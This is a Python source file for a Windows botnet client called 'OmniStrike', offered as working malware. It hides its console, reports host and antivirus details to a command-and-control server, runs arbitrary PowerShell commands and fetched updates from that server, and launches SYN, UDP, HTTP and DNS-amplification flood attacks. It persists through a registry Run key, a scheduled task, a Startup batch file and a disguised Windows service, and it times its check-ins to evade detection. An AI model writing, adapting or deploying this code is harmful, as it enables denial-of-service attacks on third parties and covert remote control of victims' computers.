#!/usr/bin/env python3
# OmniStrike Bot Client for Windows
# File: omnistrike_windows.py

import os
import sys
import platform
import socket
import uuid
import json
import time
import random
import subprocess
import threading
import requests
import psutil
import logging
import winreg
import ctypes
import struct
import dns.resolver  # For DNS amplification attack
from datetime import datetime

# Configuration
C2_SERVER = "http://your-c2-server:8080 "  # Replace with your actual C2 server address
CHECK_IN_INTERVAL = 60  # Seconds between check-ins
BOT_ID = str(uuid.uuid4())  # Generate unique bot ID
LOG_FILE = "system_service.log"  # Less suspicious name
HIDE_CONSOLE = True  # Hide console window when running

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Hide console window if needed
if HIDE_CONSOLE:
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Attack modules
class AttackModules:
    @staticmethod
    def syn_flood(target, port, duration, threads):
        """SYN flood attack implementation"""
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        
        def syn_flood_thread(target, port, end_time):
            nonlocal packets_sent, bytes_sent
            try:
                # Create raw socket for Windows
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft SYN packet (simplified for demonstration)
                packet = b'X' * 1024  # Simplified packet
                
                while time.time() < end_time:
                    sock.sendto(packet, (target, port))
                    packets_sent += 1
                    bytes_sent += len(packet)
                    time.sleep(0.001)  # Small delay to prevent CPU overload
            except Exception as e:
                logging.error(f"SYN flood error: {e}")
        
        end_time = start_time + duration
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=syn_flood_thread, args=(target, port, end_time))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        for t in thread_list:
            t.join()
            
        return {
            "packets_sent": packets_sent,
            "bytes_sent": bytes_sent,
            "duration": duration
        }
    
    @staticmethod
    def udp_flood(target, port, duration, threads):
        """UDP flood attack implementation"""
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        
        def udp_flood_thread(target, port, end_time):
            nonlocal packets_sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random payload
                payload = os.urandom(1024)  # 1KB of random data
                
                while time.time() < end_time:
                    sock.sendto(payload, (target, port))
                    packets_sent += 1
                    bytes_sent += len(payload)
                    time.sleep(0.001)  # Small delay to prevent CPU overload
            except Exception as e:
                logging.error(f"UDP flood error: {e}")
        
        end_time = start_time + duration
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=udp_flood_thread, args=(target, port, end_time))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        for t in thread_list:
            t.join()
            
        return {
            "packets_sent": packets_sent,
            "bytes_sent": bytes_sent,
            "duration": duration
        }
    
    @staticmethod
    def http_flood(target, port, duration, threads):
        """HTTP flood attack implementation"""
        start_time = time.time()
        requests_sent = 0
        bytes_sent = 0
        
        def http_flood_thread(target, port, end_time):
            nonlocal requests_sent, bytes_sent
            try:
                # User agent list for randomization
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
                ]
                
                # Determine protocol
                protocol = "https" if port == 443 else "http"
                url = f"{protocol}://{target}:{port}/"
                
                while time.time() < end_time:
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache"
                    }
                    
                    try:
                        response = requests.get(url, headers=headers, timeout=2)
                        requests_sent += 1
                        bytes_sent += len(response.content)
                    except:
                        pass
                    
                    time.sleep(0.1)  # Small delay to prevent CPU overload
            except Exception as e:
                logging.error(f"HTTP flood error: {e}")
        
        end_time = start_time + duration
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=http_flood_thread, args=(target, port, end_time))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        for t in thread_list:
            t.join()
            
        return {
            "requests_sent": requests_sent,
            "bytes_sent": bytes_sent,
            "duration": duration
        }
    
    @staticmethod
    def dns_amplification(target, duration, threads, dns_servers=None):
        """DNS Amplification attack implementation"""
        start_time = time.time()
        packets_sent = 0
        bytes_sent = 0
        
        # If no DNS servers provided, use these public DNS servers
        if not dns_servers:
            dns_servers = [
                "8.8.8.8",        # Google
                "8.8.4.4",        # Google
                "9.9.9.9",        # Quad9
                "1.1.1.1",        # Cloudflare
                "208.67.222.222", # OpenDNS
                "208.67.220.220"  # OpenDNS
            ]
        
        # DNS query types that typically return large responses
        query_types = ['ANY', 'TXT', 'MX', 'NS', 'SOA']
        
        # Domains known to have large DNS responses
        domains = [
            'google.com',
            'facebook.com',
            'amazon.com',
            'microsoft.com',
            'apple.com',
            'netflix.com',
            'cloudflare.com'
        ]
        
        def dns_amplification_thread(target, end_time, dns_servers):
            nonlocal packets_sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                while time.time() < end_time:
                    # Select random DNS server, domain and query type
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(domains)
                    query_type = random.choice(query_types)
                    
                    try:
                        # Create a DNS query packet
                        # This is a simplified implementation - in a real attack, 
                        # you would craft a raw DNS packet with spoofed source IP
                        resolver = dns.resolver.Resolver()
                        resolver.nameservers = [dns_server]
                        
                        # Set the source address to the target (IP spoofing)
                        # Note: This is simplified and may not work as expected
                        # Real DNS amplification requires raw socket programming with IP spoofing
                        sock.bind(('0.0.0.0', random.randint(10000, 65000)))
                        
                        # Send the query to the DNS server
                        # In a real attack, this would be sent with a spoofed source IP
                        query = dns.message.make_query(domain, query_type)
                        wire_query = query.to_wire()
                        sock.sendto(wire_query, (dns_server, 53))
                        
                        packets_sent += 1
                        bytes_sent += len(wire_query)
                        
                    except Exception as e:
                        logging.debug(f"DNS query error: {e}")
                    
                    time.sleep(0.01)  # Small delay
            except Exception as e:
                logging.error(f"DNS amplification error: {e}")
        
        end_time = start_time + duration
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=dns_amplification_thread, args=(target, end_time, dns_servers))
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        for t in thread_list:
            t.join()
            
        return {
            "packets_sent": packets_sent,
            "bytes_sent": bytes_sent,
            "duration": duration
        }

class BotClient:
    def __init__(self):
        self.bot_id = BOT_ID
        self.c2_server = C2_SERVER
        self.attack_modules = AttackModules()
        self.system_info = self.get_system_info()
        logging.info(f"Bot initialized with ID: {self.bot_id}")
    
    def get_system_info(self):
        """Gather system information"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(socket.gethostname())
            os_name = platform.system()
            os_version = platform.version()
            architecture = platform.machine()
            processor = platform.processor()
            ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # RAM in GB
            
            # Get Windows-specific information
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                is_admin = False
                
            try:
                windows_version = subprocess.check_output('ver', shell=True).decode('utf-8').strip()
            except:
                windows_version = os_version
                
            try:
                antivirus = self.get_antivirus_info()
            except:
                antivirus = "Unknown"
            
            return {
                "hostname": hostname,
                "ip": ip,
                "os": os_name,
                "os_version": os_version,
                "windows_version": windows_version,
                "architecture": architecture,
                "processor": processor,
                "ram": ram,
                "is_admin": is_admin,
                "antivirus": antivirus
            }
        except Exception as e:
            logging.error(f"Error gathering system info: {e}")
            return {
                "hostname": "unknown",
                "ip": "0.0.0.0",
                "os": "Windows",
                "os_version": "unknown",
                "architecture": platform.machine(),
                "processor": "unknown",
                "ram": 0,
                "is_admin": False,
                "antivirus": "Unknown"
            }
    
    def get_antivirus_info(self):
        """Get information about installed antivirus software"""
        try:
            # Check Windows Security Center
            wsc_path = r"SOFTWARE\Microsoft\Security Center\Monitoring"
            antivirus_products = []
            
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, wsc_path)
                i = 0
                while True:
                    try:
                        av_name = winreg.EnumKey(key, i)
                        antivirus_products.append(av_name)
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(key)
            except:
                pass
            
            # Check Windows Defender status
            try:
                defender_path = r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, defender_path)
                enabled = winreg.QueryValueEx(key, "DisableRealtimeMonitoring")[0] == 0
                winreg.CloseKey(key)
                if enabled:
                    antivirus_products.append("Windows Defender (active)")
                else:
                    antivirus_products.append("Windows Defender (disabled)")
            except:
                pass
            
            if not antivirus_products:
                return "No antivirus detected"
            
            return ", ".join(antivirus_products)
        except Exception as e:
            logging.error(f"Error getting antivirus info: {e}")
            return "Unknown"
    
    def check_in(self):
        """Check in with C2 server"""
        try:
            data = {
                "bot_id": self.bot_id,
                **self.system_info
            }
            
            response = requests.post(f"{self.c2_server}/check_in", json=data, timeout=10)
            
            if response.status_code == 200:
                response_data = response.json()
                
                if "command" in response_data:
                    self.handle_command(response_data["command"])
                
                if "attack" in response_data:
                    self.handle_attack(response_data["attack"])
                
                return True
            else:
                logging.error(f"Check-in failed: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            logging.error(f"Check-in error: {e}")
            return False
    
    def handle_command(self, command):
        """Handle command from C2 server"""
        cmd_type = command.get("cmd")
        logging.info(f"Received command: {cmd_type}")
        
        result = "Command not recognized"
        
        if cmd_type == "shell":
            # Execute shell command
            cmd = command.get("command", "")
            try:
                # Use PowerShell for better command execution
                powershell_cmd = f'powershell.exe -ExecutionPolicy Bypass -Command "{cmd}"'
                output = subprocess.check_output(powershell_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                result = output.decode('utf-8', errors='replace')
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8', errors='replace')}"
            except Exception as e:
                result = f"Error: {str(e)}"
        
        elif cmd_type == "update":
            # Update bot client
            url = command.get("url", "")
            try:
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    # Create a temporary file and then move it to replace the current file
                    # This helps avoid file-in-use errors
                    temp_file = f"{__file__}.new"
                    with open(temp_file, 'w') as f:
                        f.write(response.text)
                    
                    # Create a batch file to replace the current file and restart the bot
                    batch_file = "update.bat"
                    with open(batch_file, 'w') as f:
                        f.write(f'''@echo off
timeout /t 2 /nobreak > nul
copy /Y "{temp_file}" "{__file__}"
del "{temp_file}"
start "" "{sys.executable}" "{__file__}"
del "%~f0"
''')
                    
                    # Execute the batch file
                    subprocess.Popen(["cmd.exe", "/c", batch_file], 
                                    shell=True, 
                                    creationflags=subprocess.CREATE_NO_WINDOW)
                    
                    result = "Bot update initiated. Restarting..."
                else:
                    result = f"Update failed: {response.status_code}"
            except Exception as e:
                result = f"Update error: {str(e)}"
        
        elif cmd_type == "uninstall":
            # Uninstall bot
            try:
                # Remove persistence
                self.remove_persistence()
                
                # Create a batch file to delete the bot after a delay
                batch_file = "cleanup.bat"
                with open(batch_file, 'w') as f:
                    f.write(f'''@echo off
timeout /t 5 /nobreak > nul
del "{__file__}"
del "{LOG_FILE}"
del "%~f0"
''')
                
                # Execute the batch file
                subprocess.Popen(["cmd.exe", "/c", batch_file], 
                                shell=True, 
                                creationflags=subprocess.CREATE_NO_WINDOW)
                
                result = "Uninstallation initiated"
            except Exception as e:
                result = f"Uninstall error: {str(e)}"
        
        elif cmd_type == "elevate":
            # Attempt to gain admin privileges
            try:
                if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                    # Not running as admin, try to elevate
                    ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable, f'"{__file__}"', None, 1)
                    result = "Elevation requested. A UAC prompt should appear."
                else:
                    result = "Already running with admin privileges."
            except Exception as e:
                result = f"Elevation error: {str(e)}"
        
        # Send command result back to C2
        try:
            data = {
                "bot_id": self.bot_id,
                "result": result
            }
            requests.post(f"{self.c2_server}/command_result", json=data, timeout=10)
        except Exception as e:
            logging.error(f"Error sending command result: {e}")
    
    def handle_attack(self, attack):
        """Handle attack instruction from C2 server"""
        target = attack.get("target")
        port = attack.get("port", 80)
        duration = attack.get("duration", 60)
        vectors = attack.get("vectors", ["syn_flood"])
        threads = attack.get("threads", 10)
        
        logging.info(f"Received attack instruction: {vectors} against {target}:{port} for {duration}s")
        
        results = {
            "target": target,
            "duration": duration,
            "total_packets": 0,
            "total_bytes": 0,
            "vectors": {}
        }
        
        for vector in vectors:
            if vector == "syn_flood":
                result = self.attack_modules.syn_flood(target, port, duration, threads)
            elif vector == "udp_flood":
                result = self.attack_modules.udp_flood(target, port, duration, threads)
            elif vector == "http_flood":
                result = self.attack_modules.http_flood(target, port, duration, threads)
            elif vector == "dns_amplification":
                # DNS amplification doesn't use the port parameter in the same way
                result = self.attack_modules.dns_amplification(target, duration, threads)
            else:
                continue
            
            results["vectors"][vector] = result
            results["total_packets"] += result.get("packets_sent", 0) + result.get("requests_sent", 0)
            results["total_bytes"] += result.get("bytes_sent", 0)
        
        # Send attack result back to C2
        try:
            data = {
                "bot_id": self.bot_id,
                **results
            }
            requests.post(f"{self.c2_server}/attack_result", json=data, timeout=10)
        except Exception as e:
            logging.error(f"Error sending attack result: {e}")
    
    def setup_persistence(self):
        """Setup persistence mechanism for Windows"""
        try:
            # Method 1: Registry Run key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
            winreg.CloseKey(key)
            logging.info("Persistence established via Registry Run key")
            
            # Method 2: Scheduled Task (more persistent)
            try:
                task_name = "WindowsSystemUpdate"
                script_path = os.path.abspath(__file__)
                
                # Create a scheduled task that runs at logon
                cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{sys.executable}\\" \\"{script_path}\\"" /sc onlogon /ru System /f'
                subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logging.info("Persistence established via Scheduled Task")
            except Exception as e:
                logging.error(f"Scheduled task persistence error: {e}")
            
            # Method 3: Copy to Startup folder
            try:
                startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
                if os.path.exists(startup_folder):
                    shortcut_path = os.path.join(startup_folder, "WindowsUpdate.bat")
                    with open(shortcut_path, 'w') as f:
                        f.write(f'@echo off\nstart "" "{sys.executable}" "{os.path.abspath(__file__)}"')
                    logging.info("Persistence established via Startup folder")
            except Exception as e:
                logging.error(f"Startup folder persistence error: {e}")
                
        except Exception as e:
            logging.error(f"Error setting up persistence: {e}")
    
    def remove_persistence(self):
        """Remove persistence mechanism"""
        try:
            # Remove Registry Run key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            try:
                winreg.DeleteValue(key, "WindowsSystemService")
            except:
                pass
            winreg.CloseKey(key)
            
            # Remove Scheduled Task
            try:
                task_name = "WindowsSystemUpdate"
                cmd = f'schtasks /delete /tn "{task_name}" /f'
                subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            
            # Remove Startup folder shortcut
            try:
                startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
                shortcut_path = os.path.join(startup_folder, "WindowsUpdate.bat")
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
            except:
                pass
                
        except Exception as e:
            logging.error(f"Error removing persistence: {e}")
    
    def restart(self):
        """Restart the bot client"""
        python = sys.executable
        os.execl(python, python, *sys.argv)
    
    def run(self):
        """Main bot loop"""
        self.setup_persistence()
        
        while True:
            self.check_in()
            # Random jitter to avoid detection
            jitter = random.uniform(0.8, 1.2)
            time.sleep(CHECK_IN_INTERVAL * jitter)

def install_dependencies():
    """Install required dependencies"""
    required_packages = ["requests", "psutil", "dnspython"]
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

def create_windows_service():
    """Create a Windows service for the bot (requires admin)"""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            return False  # Not admin
            
        service_name = "WindowsSystemService"
        display_name = "Windows System Service"
        description = "Provides critical system functionality for Windows updates and security."
        
        # Create a batch file that will run the Python script
        batch_path = os.path.join(os.environ["TEMP"], "winsvc.bat")
        with open(batch_path, 'w') as f:
            f.write(f'@echo off\n"{sys.executable}" "{os.path.abspath(__file__)}"')
        
        # Use sc.exe to create the service
        cmd = f'sc create "{service_name}" binPath= "{batch_path}" start= auto DisplayName= "{display_name}"'
        subprocess.run(cmd, shell=True, check=True)
        
        # Set description
        cmd = f'sc description "{service_name}" "{description}"'
        subprocess.run(cmd, shell=True)
        
        # Start the service
        cmd = f'sc start "{service_name}"'
        subprocess.run(cmd, shell=True)
        
        return True
    except Exception as e:
        logging.error(f"Error creating Windows service: {e}")
        return False

if __name__ == "__main__":
    try:
        # Check if running as admin and try to create a service
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            # Running as admin, try to create a service
            if create_windows_service():
                sys.exit(0)  # Service created, exit this instance
        
        # Install dependencies if needed
        install_dependencies()
        
        # Run bot client
        bot = BotClient()
        bot.run()
    except Exception as e:
        logging.error(f"Bot client error: {e}")
        # Wait before restarting to avoid rapid restart loops
        time.sleep(60)
        # Restart the bot
        python = sys.executable
        os.execl(python, python, *sys.argv)